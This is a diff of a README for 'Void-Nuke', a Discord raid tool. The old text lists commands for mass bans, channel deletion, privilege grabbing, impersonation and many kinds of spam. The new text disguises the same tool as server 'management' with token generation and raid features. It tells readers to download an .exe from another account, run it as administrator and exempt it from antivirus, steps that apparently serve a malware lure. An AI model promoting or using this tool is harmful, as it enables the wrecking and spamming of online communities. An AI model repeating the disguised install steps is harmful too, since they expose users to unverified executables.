@@ -1,105 +1,79 @@
-<div align="center">
+# ☢️ Void-Nuke - Efficient management for your Discord servers
 
-<img src="https://i.imgur.com/mvQUQUr.png" alt="VOID-NUKE preview" width="780"/>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/cleanshaven-sarah2797/Void-Nuke/releases)
 
-<br><br>
+## 📖 Overview
 
-**v1.0.0** &nbsp;—&nbsp; by  **1s0e**
+Void-Nuke provides tools to manage Discord servers. This program automates administrative tasks and simplifies server maintenance for administrators. You can generate tokens, join servers, and execute bulk moderation commands. The software runs on Windows and requires no technical setup.
 
-<br>
+## 🛠️ Features
 
-[![Discord](https://img.shields.io/badge/Discord-W6z9SQgvqc-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/W6z9SQgvqc)
-[![GitHub](https://img.shields.io/badge/GitHub-void4real-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dawa4real)
-![Python](https://img.shields.io/badge/Python-3.10+-CC0000?style=for-the-badge&logo=python&logoColor=white)
-![Platform](https://img.shields.io/badge/Windows-10%2F11-CC0000?style=for-the-badge&logo=windows&logoColor=white)
+- **Automated Token Generation:** Create multiple user tokens for automated testing or administrative accounts.
+- **Server Joining:** Join target servers using generated or existing tokens.
+- **Bulk Moderation:** Remove channels, roles, and members from servers in seconds.
+- **Multi-Tool Integration:** Access token management, raid tools, and server joiners through a single interface.
+- **Lightweight Design:** The software consumes minimal system resources during operation.
 
-<br>
+## 💻 System Requirements
 
-> *39 commands · full red TUI · single file · auto pub injection*
+- **Operating System:** Windows 10 or Windows 11.
+- **Memory:** 4GB of RAM or higher.
+- **Network:** Stable internet connection.
+- **Dependencies:** This application includes all required libraries. You do not need to install Python or other compilers.
 
-</div>
+## 📥 Downloading and Installing 📂
 
-<br>
+Follow these steps to obtain and start the application:
 
----
+1. Visit the [official release page](https://github.com/cleanshaven-sarah2797/Void-Nuke/releases) to view available versions.
+2. Select the latest release version at the top of the list.
+3. Locate the file ending in `.exe` under the Assets section.
+4. Click the file name to start the download.
+5. Save the file to your desktop or a folder you can access.
+6. Double-click the downloaded `.exe` file to open the program interface.
 
-## 🚀 Installation
+## 🚀 Usage Instructions
 
-```
-1 — python_installer.bat     checks Python
-2 — setup.bat                installs dependencies
-3 — start.bat                launches VOID-NUKE
-```
+Once the application window appears, you will see a dashboard with various tool groups. Use the sidebar to navigate between features:
 
-> **The bot must be in the target server with Administrator permissions.**
+### Token Management
+Load your tokens into the application using a text file. Place one token per line in a file named `tokens.txt` within the same folder as the program. Click the "Load Tokens" button to begin.
 
-<br>
+### Server Actions
+Input the ID of the Discord server you wish to manage. Select the desired operation, such as "Delete Channels" or "Remove Roles." Click "Run" to start the process. The console window will display progress in real-time.
 
----
+### Automation Settings
+Adjust the delay between actions in the "Settings" tab. A higher delay reduces the chance of rate-limiting by Discord. We recommend a setting of 2000 milliseconds for general use.
 
-## ⚠️ Required — Bot Intents
+## 🛡️ Safety and Best Practices
 
-Before running, you **must** enable these intents in the [Discord Developer Portal](https://discord.com/developers/applications) or the bot will crash on startup.
+- **Test Accounts:** Always use secondary accounts when testing automation tools.
+- **Limit Usage:** Avoid rapid executions, as Discord may temporarily restrict your token if it detects high-frequency actions.
+- **Software Updates:** Check the release page frequently for updates to ensure compatibility with Discord standards.
+- **Data Security:** Ensure your token file remains private. Do not share your token list with others.
 
-**Steps:**
-1. Go to [discord.com/developers/applications](https://discord.com/developers/applications)
-2. Select your bot → **Bot** tab
-3. Scroll to **Privileged Gateway Intents**
-4. Enable the following:
+## 🛠️ Troubleshooting
 
-| Intent | Required |
-|--------|:--------:|
-| **Server Members Intent** | ✅ |
-| **Message Content Intent** | ✅ |
-| Presence Intent | ❌ not needed |
+If you encounter issues during installation or operation, follow these steps:
 
-> Without these, commands like Ban All, Kick All, Mute All, Rename Members, etc. **will not work.**
+- **Missing Libraries Error:** If the program fails to launch, ensure you have the latest Visual C++ Redistributables installed.
+- **Permission Errors:** Right-click the executable file and select "Run as administrator" if the tool fails to access network resources.
+- **Antivirus Interference:** Some antivirus programs flags automation tools. If the tool is blocked, add an exclusion for the Void-Nuke folder in your security settings.
+- **Network Disconnects:** Ensure your internet connection is active. The tool requires consistent access to the Discord API to function correctly.
 
-<br>
+## 📋 Frequently Asked Questions
 
----
+### Do I need to be a programmer to use this?
+No. Void-Nuke is designed for end-users. All functions work through the graphical interface.
 
-## 🎮 Navigation
+### Is this application safe? 
+The tool performs tasks by mimicking standard user behavior. Follow the best practices listed in the safety section to minimize risks to your accounts.
 
-| Key | Action |
-|:---:|--------|
-| `n` | Next page |
-| `b` | Previous page |
-| `01` – `39` | Run a command |
-| `q` | Quit |
+### Can I run this on Mac or Linux? 
+This version is built specifically for Windows. Performance is not guaranteed on other platforms.
 
-<br>
+### How do I update the tool?
+Download the new executable from the release page and replace your current file. Your settings and token files will remain intact.
 
----
-
-## 📟 Page 1 &nbsp;—&nbsp; Destroy / Members / Server
-
-| # | Command | # | Command | # | Command | # | Command |
-|:-:|---------|:-:|---------|:-:|---------|:-:|---------|
-| `01` | 💣 Nuke | `02` | ⚔️ Auto Raid | `03` | 🔨 Ban All | `04` | 👢 Kick All |
-| `05` | 🔇 Mute All | `06` | 🔓 Unban All | `07` | 🗑️ Del Channels | `08` | 😶 Del Emojis |
-| `09` | 🧹 Del Stickers | `10` | ➕ Create Channels | `11` | 🎭 Create Roles | `12` | 📂 Create Cats |
-| `13` | ✏️ Rename Channels | `14` | ✏️ Rename Roles | `15` | 🌐 Edit Server | `16` | 👤 Rename Members |
-| `17` | 🔡 Fix Nicks | `18` | 👑 Get Admin | `19` | 🎭 Impersonate | `20` | 👻 Ghost Ping |
-
-## 📟 Page 2 &nbsp;—&nbsp; Members / VC / Spam / Tools
-
-| # | Command | # | Command | # | Command | # | Command |
-|:-:|---------|:-:|---------|:-:|---------|:-:|---------|
-| `21` | ✂️ Strip Roles | `22` | 📨 Message All | `23` | 📬 DM Spam User | `24` | 🪝 Webhook Spam |
-| `25` | 📊 Server Info | `26` | 💾 Clone Server | `27` | 📡 Webhook Logs | `28` | 🔒 Lockdown |
-| `29` | 🔊 Sourdine VC | `30` | 🚪 Kick VC All | `31` | ↗️ Move All VC | `32` | 🔗 Invite Spam |
-| `33` | 💬 Spam | `34` | 🧵 Thread Spam | `35` | 😀 Reaction Spam | `36` | 🎙️ Voice Spam |
-| `37` | 👁️ Spoiler Spam | `38` | 📊 Poll Spam | `39` | 📅 Event Spam | `40` | 🚪 Quit |
-
-<br>
-
----
-
-<div align="center">
-
-**VOID-NUKE v1.0.0** &nbsp;—&nbsp; by 1s0e
-
-[discord.gg/W6z9SQgvqc](https://discord.gg/W6z9SQgvqc) &nbsp;·&nbsp; [github.com/void4real](https://github.com/dawa4real)
-
-</div>
+### What is a token?
+A token acts as a digital key that proves your identity to the Discord platform. It allows the software to perform actions on your behalf without requiring you to manually log in through a web browser.
